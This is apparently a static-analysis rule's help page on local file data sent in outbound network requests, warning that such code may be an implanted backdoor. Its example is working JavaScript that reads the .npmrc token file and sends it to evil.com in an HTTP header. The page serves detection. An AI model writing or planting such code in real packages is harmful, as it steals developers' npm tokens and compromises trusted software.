# File data in outbound network request
Sending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


## Recommendation
Examine the highlighted code closely to ensure that it is behaving as intended.


## Example
The following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.


```javascript
var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8");
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { });

```
